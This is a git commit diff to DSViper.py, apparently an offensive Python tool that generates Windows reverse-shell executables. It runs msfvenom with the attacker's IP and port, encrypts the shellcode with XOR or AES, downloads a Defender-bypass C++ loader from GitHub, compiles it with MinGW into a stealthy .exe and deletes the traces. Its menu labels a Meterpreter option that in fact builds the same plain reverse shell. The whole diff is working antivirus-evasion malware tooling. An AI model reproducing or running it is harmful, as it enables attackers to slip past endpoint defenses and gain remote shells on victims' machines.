4e2f5be2773a348fb35fea22ccfa1f8681402c0f
dhanush <114467712+dagowda@users.noreply.github.com>
2024-12-17 01:58:50 -0500

    Update DSViper.py

--- DSViper.py
+++ DSViper.py
@@ -6,7 +6,9 @@ import random
 from os import urandom
 import requests
 import subprocess
-
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+import hashlib
 
 def xorEncrypt(plaintext, key):
     print("\n")
@@ -16,16 +18,129 @@ def xorEncrypt(plaintext, key):
         # XOR each byte with the key in a repeating pattern
         ciphertext.append(plaintext[i] ^ key[i % len(key)])
     
-    #print("Ciphertext after XOR encryption:", ciphertext)
     return bytes(ciphertext)
-'''
-if len(sys.argv)!=3:
-   print("usage: python3 exploit.py <ip address> <port>")
-   sys.exit(1)
-'''
-RED = "\33[91m"
-banner = f"""
-{RED}
+    
+    
+def AESencrypt(plaintext, key):
+    k = hashlib.sha256(key).digest()  # Derive the AES key using SHA-256
+    iv = 16 * b'\x00'  # Initialization vector (16 bytes, zeroed)
+    plaintext = pad(plaintext, AES.block_size)  # Pad the plaintext
+    cipher = AES.new(k, AES.MODE_CBC, iv)  # Create AES cipher in CBC mode
+    ciphertext = cipher.encrypt(plaintext)  # Encrypt the padded plaintext
+    return ciphertext, key
+    
+def OURFIRSTMETHODXOR():
+    GREEN = "\033[92m"
+    BOLD = "\033[1m"
+    WHITE = "\033[97m"
+    if payloadtype == '1':
+       msfvenom_command = f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={ipadd} LPORT={port} -f raw > payload.bin"
+    elif payloadtype == '2':
+       msfvenom_command = f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={ipadd} LPORT={port} -f raw > payload.bin"
+    else:
+       print("invalid option")
+       exit(1)
+    
+    subprocess.run(msfvenom_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    
+    with open("payload.bin", "rb") as file:
+        content = file.read()
+    key = [random.randint(0, 255) for _ in range(16)]
+    ciphertext = xorEncrypt(content, key)
+
+    XOR_key = bytes(key)
+    with open("key.bin", "wb") as f:
+        f.write(XOR_key)
+
+    XOR_code = bytes(ciphertext)
+    with open("code.bin", "wb") as f:
+        f.write(XOR_code)
+
+    with open("resources.rc", "wb") as f:
+        f.write('AESCODE   RCDATA   "code.bin"\n'.encode('utf-8'))
+        f.write('AESKEY    RCDATA   "key.bin"\n'.encode('utf-8'))
+
+    url = "https://raw.githubusercontent.com/dagowda/XOR_resource_defender_bypass_2025/refs/heads/main/XORbypass.cpp"
+    try:
+        res = requests.get(url)
+        with open("XORbypass.cpp", "wb") as f:
+            f.write(res.content)
+    except requests.RequestException as e:
+        print(f"Error: {e}")
+        exit(1)
+
+    try:
+        subprocess.run(["x86_64-w64-mingw32-windres", "resources.rc", "-O", "coff", "-o", "resources.res"], check=True)
+        subprocess.run(["x86_64-w64-mingw32-g++", "--static", "-o", "DSViper1.exe", "XORbypass.cpp", "resources.res", "-fpermissive", "-lws2_32"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        print(f"{GREEN}{BOLD}[*]Payload successfully created as DSViper1.exe")
+    except subprocess.CalledProcessError as e:
+        print(f"Error: {e}")
+
+    files = ["payload.bin", "code.bin", "key.bin", "resources.res", "resources.rc", "XORbypass.cpp"]
+    for file in files:
+        os.remove(file)
+
+def OURSECONDMETHODAES():
+    GREEN = "\033[92m"
+    BOLD = "\033[1m"
+    WHITE = "\033[97m"
+    if payloadtype == '1':
+       msfvenom_command = f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={ipadd} LPORT={port} -f raw > payload.bin"
+    elif payloadtype == '2':
+       msfvenom_command = f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={ipadd} LPORT={port} -f raw > payload.bin"
+    else:
+       print("invalid option")
+       exit(1)
+    subprocess.run(msfvenom_command,shell=True, check=True ,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+    
+    with open("payload.bin", "rb") as file:
+            content = file.read()
+    KEY = urandom(16)
+    
+    ciphertext, key = AESencrypt(content, KEY)
+    
+    with open("key.bin", "wb") as key_file:
+        key_file.write(KEY)
+
+    # Save the encrypted payload to a binary file (AEScode.bin)
+    with open("code.bin", "wb") as code_file:
+        code_file.write(ciphertext)
+    
+    with open("resources.rc", "wb") as f:
+        f.write('AESCODE   RCDATA   "code.bin"\n'.encode('utf-8'))
+        f.write('AESKEY    RCDATA   "key.bin"\n'.encode('utf-8'))
+
+    url = "https://raw.githubusercontent.com/dagowda/XOR_resource_defender_bypass_2025/refs/heads/main/AES/AESbypass.cpp"
+    try:
+        res = requests.get(url)
+        with open("AESbypass.cpp", "wb") as f:
+            f.write(res.content)
+    except requests.RequestException as e:
+        print(f"Error: {e}")
+        exit(1)
+    
+    try:
+        subprocess.run(["x86_64-w64-mingw32-windres", "resources.rc", "-O", "coff", "-o", "resources.res"], check=True)
+        subprocess.run(["x86_64-w64-mingw32-g++", "--static", "-o", "DSViper2.exe", "AESbypass.cpp", "resources.res", "-fpermissive", "-lws2_32"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        print(f"{GREEN}{BOLD}[*]Payload successfully created as DSViper2.exe")
+    except subprocess.CalledProcessError as e:
+        print(f"Error: {e}")
+
+    files = ["payload.bin", "code.bin", "key.bin", "resources.res", "resources.rc", "AESbypass.cpp"]
+    for file in files:
+        os.remove(file)
+    
+
+if __name__ == "__main__":
+    WHITE = "\033[97m"
+    RED = "\33[91m"
+    RED = "\033[91m"
+    GREEN = "\033[92m"
+    YELLOW = "\033[93m"
+    BOLD = "\033[1m"
+    RESET = "\033[0m"
+    banner = f"""
+            {RED}{BOLD}
 
 ░▒▓███████▓▒░ ░▒▓███████▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░  
 ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
@@ -37,77 +152,25 @@ banner = f"""
                                                                                              
                                                                                                 
     """
-print(banner)
+    print(banner)
 
-ipadd = input("IP Address: ")
-port = input("Port: ")
+    ipadd = input(f"{WHITE}{BOLD}Enter your attacker machine's IP Address: ")
+    port = input(f"{WHITE}{BOLD}Enter your attacker machine's Port: ")
+    payloadtype= input(f"{WHITE}{BOLD}Please enter the number for the type of payload:\n1.) Netcat\n2.) Meterpreter\n>")
+    stealth_type = input(f"{WHITE}{BOLD}Select your stealthy stride:\n1.) Moderate\n2.) High\n>")
 
-msfvenom_command = f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={ipadd} LPORT={port} -f raw > payload.bin"
+    if payloadtype == "1":
+        print(f"Selected payload: Netcat reverse shell")
+    elif payloadtype == "2":
+        print(f"Selected payload: Meterpreter reverse shell")
+    else:
+        print(f"Invalid payload selection. Please enter 1 or 2.")
 
-subprocess.run(msfvenom_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-
-with open("payload.bin", "rb") as file:
-        content = file.read()
-key = [random.randint(0, 255) for _ in range(16)]
-ciphertext = xorEncrypt(content, key)
-
-
-'''
-#XORkey = { 0x' + ', 0x'.join(hex(x)[2:] for x in key) + ' };')
-#XORshellcode = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };')
-#XORkey = ', '.join(f'0x{x:02x}' for x in key)
-#XORshellcode = ', '.join(f'0x{x:02x}' for x in ciphertext)
-#print(XORkey)
-#print("\n")
-#print(XORshellcode)
-#print("\n")
-'''
-XOR_key = bytes(key)
-with open("XORkey.bin", "wb") as f:
-    f.write(XOR_key)
-
-# Save XORcode.bin
-XOR_code = bytes(ciphertext)
-    # ... (add all remaining bytes)
-with open("XORcode.bin", "wb") as f:
-    f.write(XOR_code)
-    
-
-
-with open("resources.rc", "wb") as f:
-    f.write('AESCODE   RCDATA   "XORcode.bin"\n'.encode('utf-8'))
-    f.write('AESKEY    RCDATA   "XORkey.bin"\n'.encode('utf-8'))
-    
-    
-    
-url= "https://raw.githubusercontent.com/dagowda/XOR_resource_defender_bypass_2025/refs/heads/main/XORbypass.cpp"
-
-try:
-   res=requests.get(url)
-   with open("XORbypass.cpp", "wb") as f:
-       f.write(res.content)
-except requests.RequestException as e:
-   print("the error is {e}")
-   exit(1)
-   
-try:
-  subprocess.run(["x86_64-w64-mingw32-windres", "resources.rc", "-O", "coff", "-o", "resources.res"],check=True)
-  #print("Resource Compiled Successfully")
-  subprocess.run(["x86_64-w64-mingw32-g++",
-            "--static",
-            "-o",
-            "DSViper.exe",
-            "XORbypass.cpp",
-            "resources.res",
-            "-fpermissive",
-            "-lws2_32" ],
-            check=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)#to make sure that the compilations errors are not shown
-  print("Malicious payload successfully created as DSViper.exe")
-except subprocess.CalledProcessError as e:
-    print("there is an error {e}")
-    
-files=["payload.bin","XORcode.bin","XORkey.bin","resources.res","resources.rc","XORbypass.cpp"]
-for file in files:
-   os.remove(file)
-print("\n")
-#printf("clean up is done")
+    if stealth_type == "1":
+        print(f"Selected stealth level: Moderate.")
+        OURFIRSTMETHODXOR()
+    elif stealth_type == "2":
+        print(f"Selected stealth level: High.")
+        OURSECONDMETHODAES()
+    else:
+        print(f"Invalid stealth level. Please enter 1 or 2")
